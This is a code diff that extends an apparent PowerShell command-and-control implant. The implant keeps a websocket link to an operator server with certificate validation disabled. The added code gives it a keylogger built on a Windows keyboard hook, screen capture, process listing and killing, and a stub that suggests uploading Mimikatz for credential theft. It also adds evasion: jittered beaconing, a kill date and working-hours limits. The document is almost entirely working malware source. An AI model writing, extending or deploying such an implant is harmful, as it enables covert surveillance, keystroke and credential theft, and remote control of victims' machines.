@@ -1,10 +1,17 @@
-# Injected at serve time: SERVER_URL, CLIENT_ID, CLIENT_SECRET
+# Injected at serve time: SERVER_URL, CLIENT_ID, CLIENT_SECRET, CALLBACK_INTERVAL, JITTER_PERCENT, KILL_DATE, WORKING_HOURS_START, WORKING_HOURS_END
 $ServerUrl = "SERVER_URL"
 $ClientId = "CLIENT_ID"
 $ClientSecret = "CLIENT_SECRET"
+$CallbackInterval = [int]"CALLBACK_INTERVAL"
+if ($CallbackInterval -le 0) { $CallbackInterval = 30 }
+$JitterPercent = [int]"JITTER_PERCENT"
+if ($JitterPercent -lt 0) { $JitterPercent = 0 }; if ($JitterPercent -gt 100) { $JitterPercent = 100 }
+$KillDateStr = "KILL_DATE"
+$WorkingHoursStart = "WORKING_HOURS_START"
+$WorkingHoursEnd = "WORKING_HOURS_END"
 
 $wsUri = [System.Uri](($ServerUrl -replace 'https://','wss://' -replace 'http://','ws://') + '/live')
-$auth = @{ client_id = $ClientId; client_secret = $ClientSecret } | ConvertTo-Json -Compress
+$auth = @{ client_id = $ClientId; client_secret = $ClientSecret; platform = "windows" } | ConvertTo-Json -Compress
 
 function Send-WebSocketText {
   param([System.Net.WebSockets.ClientWebSocket]$ws, [string]$text, [System.Threading.CancellationToken]$ct)
@@ -80,7 +87,116 @@ function Do-ListDir {
   } catch { return $null, $_.Exception.Message }
 }
 
+function Do-Screenshot {
+  try {
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+    $g = [System.Drawing.Graphics]::FromImage($b)
+    $g.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
+    $ms = New-Object System.IO.MemoryStream
+    $b.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+    return [Convert]::ToBase64String($ms.ToArray()), $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Do-ProcessList {
+  try {
+    $list = Get-Process | ForEach-Object { @{ pid = $_.Id; ppid = if ($_.ParentId) { $_.ParentId } else { 0 }; user = ""; name = $_.ProcessName } }
+    return ($list | ConvertTo-Json -Compress), $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Do-Prockill {
+  param([string]$pidStr)
+  try {
+    $pidInt = [int]$pidStr
+    Stop-Process -Id $pidInt -Force -ErrorAction Stop
+    return "ok", $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+$script:KeylogHook = $null
+
+function Do-KeylogStart {
+  try {
+    if ($script:KeylogHook) { return "already running", $null }
+    Add-Type -ReferencedAssemblies System.Windows.Forms -TypeDefinition @"
+using System; using System.Text; using System.Runtime.InteropServices;
+public class Keylog {
+  private static StringBuilder sb = new StringBuilder();
+  private static object lockObj = new object();
+  private static IntPtr hookId = IntPtr.Zero;
+  private static LowLevelKeyboardProcDelegate _delegate;
+  public static void SetHook() {
+    _delegate = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
+    hookId = SetWindowsHookEx(13, _delegate, GetModuleHandle(null), 0);
+  }
+  public static void Unhook() { if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId); hookId = IntPtr.Zero; }
+  public static string GetAndClear() { lock(lockObj) { string s = sb.ToString(); sb.Clear(); return s; } }
+  private static IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam) {
+    if (nCode >= 0 && wParam == (IntPtr)256) {
+      int vk = Marshal.ReadInt32(lParam);
+      lock(lockObj) { sb.Append((char)MapVirtualKey((uint)vk, 2)); }
+    }
+    return CallNextHookEx(hookId, nCode, wParam, lParam);
+  }
+  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProcDelegate proc, IntPtr mod, uint threadId);
+  [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
+  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
+  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+  [DllImport("user32.dll")] static extern uint MapVirtualKey(uint code, uint type);
+  private delegate IntPtr LowLevelKeyboardProcDelegate(int nCode, IntPtr wParam, IntPtr lParam);
+}
+"@
+    [Keylog]::SetHook()
+    $script:KeylogHook = $true
+    return "ok", $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Do-KeylogStop {
+  try {
+    if (-not $script:KeylogHook) { return $null, "not running" }
+    [Keylog]::Unhook()
+    $out = [Keylog]::GetAndClear()
+    $script:KeylogHook = $null
+    return $out, $null
+  } catch { return $null, $_.Exception.Message }
+}
+
+function Test-PastKillDate {
+  if (-not $KillDateStr) { return $false }
+  $t = $null
+  if ([DateTime]::TryParse($KillDateStr, [ref]$t)) { return (Get-Date) -gt $t }
+  return $false
+}
+
+function Test-InWorkingHours {
+  if (-not $WorkingHoursStart -or -not $WorkingHoursEnd) { return $true }
+  $now = Get-Date
+  $startParts = $WorkingHoursStart -split ':'
+  $endParts = $WorkingHoursEnd -split ':'
+  if ($startParts.Count -lt 2 -or $endParts.Count -lt 2) { return $true }
+  $startMins = [int]$startParts[0] * 60 + [int]$startParts[1]
+  $endMins = [int]$endParts[0] * 60 + [int]$endParts[1]
+  $nowMins = $now.Hour * 60 + $now.Minute
+  if ($startMins -le $endMins) { return $nowMins -ge $startMins -and $nowMins -le $endMins }
+  return $nowMins -ge $startMins -or $nowMins -le $endMins
+}
+
+function Get-SleepSecondsWithJitter {
+  $center = $CallbackInterval
+  $half = [int]([double]$center * $JitterPercent / 100)
+  $offset = if ($half -gt 0) { Get-Random -Minimum (-$half) -Maximum ($half + 1) } else { 0 }
+  $sec = $center + $offset
+  if ($sec -lt 1) { $sec = 1 }
+  return $sec
+}
+
 while ($true) {
+  if (Test-PastKillDate) { exit 0 }
+  while (-not (Test-InWorkingHours)) { Start-Sleep -Seconds (Get-SleepSecondsWithJitter) }
   try {
     $ws = [System.Net.WebSockets.ClientWebSocket]::new()
     $ws.Options.RemoteCertificateValidationCallback = { $true }
@@ -113,6 +229,29 @@ while ($true) {
           $o, $e = Do-ListDir -path $cmd.args.path
           if ($e) { $err = $e } else { $out = $o }
         }
+        "screenshot" {
+          $o, $e = Do-Screenshot
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "processlist" {
+          $o, $e = Do-ProcessList
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "prockill" {
+          $o, $e = Do-Prockill -pidStr $cmd.args.pid
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "keylog_start" {
+          $o, $e = Do-KeylogStart
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "keylog_stop" {
+          $o, $e = Do-KeylogStop
+          if ($e) { $err = $e } else { $out = $o }
+        }
+        "creds" {
+          $out = "creds: upload and run your tool via exec (e.g. Mimikatz). Not implemented in implant."
+        }
         default { $err = "unknown type: $($cmd.type)" }
       }
       $resp = @{ command_id = $id; status = if ($err) { "error" } else { "success" }; output = $out; error = $err } | ConvertTo-Json -Compress
@@ -120,5 +259,5 @@ while ($true) {
     }
     $ws.Dispose()
   } catch {}
-  Start-Sleep -Seconds 30
+  Start-Sleep -Seconds (Get-SleepSecondsWithJitter)
 }
